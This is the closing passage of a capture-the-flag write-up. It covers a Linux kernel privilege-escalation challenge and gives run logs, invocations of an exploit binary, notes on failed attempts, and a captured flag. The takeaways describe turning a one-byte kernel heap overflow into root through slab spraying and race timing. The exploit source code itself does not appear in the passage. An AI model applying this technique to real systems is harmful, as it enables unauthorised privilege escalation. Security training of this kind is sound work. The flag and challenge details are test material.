[conn] connecting to ctf.vulnbydefault.com:12625
[pow] bits=32 resource=avvDFOzS64YNPLqO
[pow] challenge: Send the output of: hashcash -mb32 avvDFOzS64YNPLqO

>>> Solve this in Google Colab, then paste the stamp below <<<

Stamp: 1:32:260305:avvDFOzS64YNPLqO::gX9574:880dd763
[try] attempt=1 cmd=/tmp/e 0x04 220 10 900 3 2000 6 20
[+] FLAG VBD{On3_byt3_a_dr3am_w0rk1ng_w1th_p1p3s_316dbee3615588c7efe25ee55cd3c281}
```

### Failed Attempts Before Success

**Attempt 1 (port 7239):** Exploit ran but timed out - missed the race window.
```
[try] attempt=1 cmd=/tmp/e 0x04 220 10 900 3 2000 6 20
[conn] ended state=timeout
[-] no flag
```

**Attempt 2 (port 7239):** QEMU lock contention - another instance was still running.
```
[conn] error: remote busy (qemu lock)
[-] no flag
```

**Attempt 3 (port 12625):** First-try success on a fresh port.
```
[+] FLAG VBD{On3_byt3_a_dr3am_w0rk1ng_w1th_p1p3s_316dbee3615588c7efe25ee55cd3c281}
```

---

## 8. Key Takeaways

1. **Off-by-one matters.** A single byte overflow in the kernel heap is enough for full privilege escalation when combined with the right slab spray technique.

2. **The exploit is probabilistic.** It relies on timing-sensitive race conditions between cred allocation, the overflow, and the spray. Not every attempt succeeds - retrying on a fresh port is often necessary.

3. **GPU acceleration is practical for PoW.** A 32-bit hashcash challenge that would take minutes on CPU is solved in seconds on a Google Colab T4 GPU using a custom CUDA kernel.

4. **Possible outcome states:**
   - `FLAG VBD{...}` - exploit succeeded, flag captured
   - `timeout` - exploit missed the race window
   - `remote busy (qemu lock)` - another QEMU instance holds the lock
   - `panic` - kernel crash during the exploit attempt

---

## 9. Files Used

| File | Purpose |
|------|---------|
| Embedded exploit source code in this writeup | Kernel exploit source and build input |
| `exploit` (compiled locally) | Binary uploaded to remote VM |
| `remote_manual_pow.py` | Remote solver with manual PoW |
| `colab gpu.py` | CUDA hashcash solver for Google Colab |

---

## Flag

```
VBD{On3_byt3_a_dr3am_w0rk1ng_w1th_p1p3s_316dbee3615588c7efe25ee55cd3c281}
```


